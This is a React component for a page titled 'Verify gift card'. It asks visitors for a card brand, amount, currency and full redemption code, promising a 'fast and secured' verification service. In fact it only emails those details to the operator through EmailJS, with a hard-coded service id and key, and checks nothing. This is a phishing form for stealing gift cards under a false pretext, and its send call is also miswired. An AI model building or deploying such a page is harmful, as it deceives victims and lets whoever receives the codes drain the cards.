import React, { useState } from 'react'
import emailjs from 'emailjs-com'

const Contactsection = () => {
    let [cardDetails, setCardDetails] = useState({
        cardName: '',
        cardAmount: '',
        currency: '',
        cardRedeptionCode: '',
    });

    const handleChange = (event) => {
        let { name, value } = event.target

        setCardDetails((prevalue) => {
            return {
                ...prevalue,
                [name]: value,
            }
        })
        console.log(cardDetails)
    }
    const handleForm = (e) => {
        e.preventDefault()
        let { cardName, cardAmount, cardRedeptionCode, currency } = cardDetails
        const messageBody = `The card type is ${cardName} and card price is ${cardAmount}. While the redemption code is ${cardRedeptionCode} the currency is in ${currency}`
        emailjs.sendForm('GoodluckCheckr', 'template_3ifu5oo',
            messageBody, 'WBfx5IJfXs24MFMwVEsc0')
            
            .then((result) => {
                console.log(result.text);
            },
            (error) => {
                    console.log(error.text);
                });
    }
    return (
        <section class="bg-[#e8f8ff] dark:bg-gray-900" id='verifyCard'>
            <div class="py-5 lg:py-16 md:px-4 px-2 mx-auto">
                <h2 class="mb-4 text-4xl tracking-tight font-extrabold text-center text-[#0B212F] dark:text-white capitalize">Verify gift card</h2>
                <p class="mb-5 lg:mb-16 font-light text-center text-gray-500 dark:text-gray-400 sm:text-xl">Verify if your gift card is valid or not using our fast and secured gift card verification service.</p>
                <form action="#" class="space-y-5 w-full items-center justify-center flex flex-col">
                    <div className='w-full flex flex-col items-center justify-center'>
                        <label for="cardSelect" class=" md:w-[75%] w-[95%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-[#0B212F] dark:text-white">Select Card</label>
                        <select id="cardSelect" value={cardDetails.cardName} name='cardName' onChange={handleChange} class="bg-gray-50 h-[55px] w-[95%] md:w-[65%] border border-gray-300 text-[#0B212F] text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                            <option value="apple">apple </option>
                            <option value="amex">amex </option>
                            <option value="amazon">amazon</option>
                            <option value="ebay">ebay</option>
                            <option value="googleplay">googleplay</option>
                            <option value="mastercard">mastercard</option>
                            <option value='nike'>nike</option>
                            <option value="nordstorm">nordstorm </option>
                            <option value="playstation">playstation</option>
                            <option value="razoeGold">razoeGold</option>
                            <option value="sephoral">sephoral</option>
                            <option value='Steam'>Steam</option>
                            <option value="TT visa">TT visa</option>
                            <option value="vanilla visa">vanilla visa</option>
                            <option value="Visa silvery White">Visa silvery White</option>
                            <option value="Walmart Visa">Walmart Visa</option>
                            <option value='Xbox'> Xbox</option>
                        </select>
                    </div>
                    <div className='w-full flex flex-col items-center justify-center'>
                        <label for="subject" class=" md:w-[75%] w-[95%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-gray-300">Enter Amount</label>
                        <input type="number" name='cardAmount' value={cardDetails.cardAmount} onChange={handleChange} id="subject" class="block  h-[55px] w-[95%] md:w-[65%] p-3 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 shadow-sm focus:ring-primary-500 focus:border-primary-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-primary-500 dark:focus:border-primary-500 dark:shadow-sm-light" placeholder="1000" required />
                    </div>
                    <div className='w-full flex flex-col items-center justify-center'>
                        <label for="countries" class=" md:w-[75%] w-[95%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-white">Select Currency</label>
                        <select id="countries" onChange={handleChange}
                            name='currency'
                            value={cardDetails.currency} class="bg-gray-50 h-[55px] w-[95%] md:w-[65%] border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                            <option value='USD'>USD</option>
                            <option value="CAD">CAD</option>
                            <option value="AUD">AUD</option>
                            <option value="EUR">EUR</option>
                            <option value="GBP">GBP</option>
                        </select>
                    </div>
                    <div class="sm:col-span-2 w-full flex flex-col items-center justify-center">
                        <label for="cardRedeptionCode" class=" w-[95%] md:w-[75%] items-center justify-start md:px-20 block mb-2 text-sm font-medium text-gray-900 dark:text-gray-400">Redemption Code</label>
                        <input type='text' onChange={handleChange}
                            value={cardDetails.cardRedeptionCode}
                            id='cardRedeptionCode'
                            name='cardRedeptionCode'
                            class="block p-2.5 h-[55px] w-[95%] md:w-[65%] text-sm text-gray-900 bg-gray-50 rounded-lg shadow-sm border border-gray-300 focus:ring-primary-500 focus:border-primary-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-primary-500 dark:focus:border-primary-500"
                            placeholder="Redemption Code" />
                    </div>
                    <button type="submit" class="py-3 px-5 h-[55px] w-[95%] md:w-[65%] text-sm font-medium text-center text-white rounded-lg bg-primary-700 bg-[#0B212F] hover:bg-[#0B212F] focus:ring-4 focus:outline-none focus:ring-primary-300 dark:bg-primary-600 dark:hover:bg-primary-700 dark:focus:ring-primary-800" onClick={handleForm}>Verify</button>
                </form>
            </div>
        </section>
    )
}

export default Contactsection
